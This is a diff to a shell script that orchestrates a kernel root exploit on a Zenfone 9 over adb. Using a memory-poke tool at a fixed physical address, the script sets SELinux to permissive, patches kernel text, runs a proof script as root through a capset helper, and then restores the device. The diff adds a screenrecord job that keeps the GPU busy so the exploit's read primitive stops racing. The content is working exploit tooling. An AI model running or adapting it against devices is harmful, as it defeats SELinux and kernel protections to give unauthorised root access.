@@ -2,11 +2,20 @@
 # demo-root.sh — one full root session that produces on-screen + on-disk proof, then cleans up.
 # Flow: SELinux permissive -> patch text -> run proof.sh as root -> screenshot -> restore everything.
 set -u
-S=${ZF9_SERIAL:?set ZF9_SERIAL to your device serial}
+[ -f "$(dirname "$0")/../device.env" ] && . "$(dirname "$0")/../device.env"
+S=${ZF9_SERIAL:?set ZF9_SERIAL (or create device.env)}
 DIR=$(cd "$(dirname "$0")" && pwd)
 LOG=$HOME/Dev/zenfone9-root/logs/root-demo-$(date +%Y%m%d-%H%M%S)
 mkdir -p "$LOG"
 
+gpu_load_start() {
+    adb -s "$S" shell 'screenrecord --time-limit 1800 /data/local/tmp/gpuload.mp4 >/dev/null 2>&1 &' </dev/null >/dev/null 2>&1
+    sleep 2
+}
+gpu_load_stop() { adb -s "$S" shell 'pkill -f screenrecord' </dev/null >/dev/null 2>&1; }
+
+# NOTE: reads race too when the GPU is idle, so patch-dwords.sh keeps a screenrecord load alive
+# for the whole operation. This script additionally keeps the screen awake between steps.
 sel() {  # $1 = selinux_state dword, $2 = wanted getenforce; verify it FLIPS AND STICKS
     for attempt in $(seq 1 12); do
         adb -s "$S" shell "CHEESE_POKE=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=0xaaa40b98 \
@@ -35,6 +44,7 @@ restore() {
     echo "[demo] restoring kernel text..."
     "$DIR/patch-dwords.sh" restore 2>&1 | tail -1
     echo "[demo] restoring SELinux Enforcing..."
+    gpu_load_stop
     sel 0x01010001 Enforcing >/dev/null || echo "[demo] WARNING: SELinux not restored - reboot will fix"
     echo "[demo] clean: text pristine, SELinux Enforcing"
 }
@@ -58,6 +68,7 @@ echo "[demo] patch verified: FULLY PATCHED"
 # something can re-assert enforcing shortly after boot, so re-check right before rooting
 sel 0x01010000 Permissive || { echo "[demo] SELinux not permissive - root would be killed"; exit 1; }
 echo "[demo] getenforce (pre-root): $(adb -s "$S" shell getenforce </dev/null 2>&1)"
+gpu_load_start   # the root call + proof reads are GPU-primitive ops too: keep the GPU busy
 echo "[demo] === running proof.sh AS ROOT ==="
 adb -s "$S" shell '/data/local/tmp/call_capset sh /data/local/tmp/proof.sh' </dev/null 2>&1 | tee "$LOG/proof.txt"
 
